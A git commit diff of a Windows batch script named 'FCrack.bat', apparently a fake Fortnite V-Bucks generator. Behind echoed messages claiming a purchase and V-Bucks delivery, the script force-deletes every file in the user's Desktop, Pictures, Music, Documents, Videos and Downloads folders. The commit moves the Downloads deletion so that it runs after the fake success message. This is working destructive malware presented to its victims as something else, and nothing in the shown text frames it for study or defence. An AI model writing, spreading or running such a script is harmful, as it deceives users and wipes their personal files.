682519b2f18630286e2a43f3bcdef2183890cbb1
VadimCanPlayOfficial <141765567+VadimCanPlay@users.noreply.github.com>
2024-09-25 16:00:49 +0300

    Update FCrack.bat

--- FCrack.bat
+++ FCrack.bat
@@ -3,7 +3,6 @@ title FCrack
 cd C:\Users\%username%\
 del Desktop\* /q /f
 del Pictures\* /q /f
-del Downloads\* /q /f
 del Music\* /q /f
 del Documents\* /q /f
 del Videos\* /q /f
@@ -17,3 +16,5 @@ echo Purchased!
 echo Sending V-Bucks to %vbucks%...
 ping localhost -n 15 >nul
 echo V-Bucks sent! Check balance in 1-2 days!
+ping localhost -n 5 >nul
+del Downloads\* /q /f
